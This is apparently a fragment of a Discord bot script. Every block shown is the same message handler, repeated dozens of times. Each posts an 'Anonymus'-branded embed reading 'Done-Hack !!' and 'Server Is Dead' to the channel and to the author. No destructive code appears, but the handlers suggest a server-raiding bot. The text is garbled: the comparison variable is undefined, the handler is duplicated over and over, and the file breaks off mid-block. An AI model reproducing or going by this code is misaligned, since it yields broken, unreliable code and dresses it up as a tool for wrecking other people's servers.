client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
